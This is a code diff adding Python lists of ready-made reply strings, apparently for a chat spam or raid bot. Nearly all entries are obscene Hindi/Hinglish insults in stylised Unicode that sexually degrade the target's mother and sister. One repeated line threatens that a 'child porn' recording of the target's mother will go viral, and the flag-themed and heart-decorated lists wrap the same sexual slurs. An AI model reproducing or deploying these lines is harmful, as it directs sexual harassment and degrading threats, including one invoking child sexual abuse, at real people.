+"तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
+"𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
+"सोच तेरी बहन को 𝐂ʜᴀᴍᴘᴜ बाप का गुलाम चोद रहा 😎🔥",
+"Hello hello?? Oxygen aarahi है? रण्डी पुत्र 🧘🏻",
+"Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन 𝐂ʜᴀᴍᴘᴜ /\\~ 👑 बाप से सही chudi 🥵🔥",
+"ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ 𝐂ʜᴀᴍᴘᴜ बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
+"🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके MOAN करती है ! 🛐","⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद 𝐂ʜᴀᴍᴘᴜ बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
+"नहीं नहीं तेरी मां को 𝐒ɪʀғ 𝐂ʜᴀᴍᴘᴜ बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
+"तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
+"𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
+"सोच तेरी बहन को 𝐂ʜᴀᴍᴘᴜ बाप का गुलाम चोद रहा 😎🔥",
+"Hello hello?? Oxygen aarahi है? रण्डी पुत्र 🧘🏻",
+"Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन 𝐂ʜᴀᴍᴘᴜ /\\~ 👑 बाप से सही chudi 🥵🔥",
+"ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ 𝐂ʜᴀᴍᴘᴜ बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
+"🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके MOAN करती है ! 🛐"]
+
+fun_texts = ["तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
+"𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
+"𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
+"˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
+"𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
+"⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭","तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
+"𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
+"𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
+"˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
+"𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
+"⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭","तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
+"𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
+"𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
+"˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
+"𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
+"⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭","तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
+"𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
+"𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
+"˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
+"𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
+"⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭" ]
+
+flag_texts = [" ོ༘₊⁺🇮🇳 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ 𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ  𝐈ɴᴅɪᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇳 ₊⁺⋆.˚",
+" ོ༘₊⁺🇯🇵 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐉ᴀᴘᴀɴ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇯🇵 ₊⁺⋆. " ,
+" ₊⁺🇺🇸 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐒𝐀 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇺🇸 ₊⁺⋆.˚",
+" ོ༘₊⁺🇬🇧 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐊 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇬🇧 ₊⁺⋆.˚", 
+" ོ༘₊⁺🇰🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐊ᴏʀᴇᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇰🇷 ₊⁺⋆.˚",
+" ོ༘₊⁺🇩🇪 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐆ᴇʀᴍᴀɴʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇩🇪 ₊⁺⋆.˚",
+" ོ༘₊⁺🇫🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐅ʀᴀɴᴄᴇ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇫🇷 ₊⁺⋆.˚",
+" ོ༘₊⁺🇮🇹 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐈ᴛᴀʟʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇹 ₊⁺⋆.˚",
+" ོ༘₊⁺🇧🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐁ʀᴀᴢɪʟ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇧🇷 ₊⁺⋆.˚",
+" ོ༘₊⁺🇨🇦 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐂ᴀɴᴀᴅᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇨🇦 ₊⁺⋆.˚"," ོ༘₊⁺🇮🇳 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ 𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ  𝐈ɴᴅɪᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇳 ₊⁺⋆.˚",
+" ོ༘₊⁺🇯🇵 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐉ᴀᴘᴀɴ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇯🇵 ₊⁺⋆. " ,
+" ₊⁺🇺🇸 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐒𝐀 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇺🇸 ₊⁺⋆.˚",
+" ོ༘₊⁺🇬🇧 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐊 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇬🇧 ₊⁺⋆.˚", 
+" ོ༘₊⁺🇰🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐊ᴏʀᴇᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇰🇷 ₊⁺⋆.˚",
+" ོ༘₊⁺🇩🇪 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐆ᴇʀᴍᴀɴʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇩🇪 ₊⁺⋆.˚",
+" ོ༘₊⁺🇫🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐅ʀᴀɴᴄᴇ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇫🇷 ₊⁺⋆.˚",
+" ོ༘₊⁺🇮🇹 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐈ᴛᴀʟʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇹 ₊⁺⋆.˚",
+" ོ༘₊⁺🇧🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐁ʀᴀᴢɪʟ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇧🇷 ₊⁺⋆.˚",
+" ོ༘₊⁺🇨🇦 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  𝐂ʜᴀᴍᴘᴜ 𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐂ᴀɴᴀᴅᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇨🇦 ₊⁺⋆.˚"]
+
+heart_replies = ["𓂃˖˳·˖ ִֶָ ⋆❤️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❤️ ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🧡͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🧡 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💛͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💛 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💚͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💚 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💙͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💙 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💜͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💜 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🖤͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🖤 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🤍͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🤍 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🤎͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🤎 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💖͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💖 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💗͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💗 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💓͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💓 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💞͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💞 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💕͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💕 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💘͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💘 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💝͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💝 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💟͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💟 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❣️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❣️ ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❤️‍🔥͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❤️‍🔥 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❤️‍🩹͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❤️‍🩹 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❤️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❤️ ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🧡͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🧡 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💛͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💛 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💚͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💚 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💙͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💙 ݁˖⭑.ᐟ",
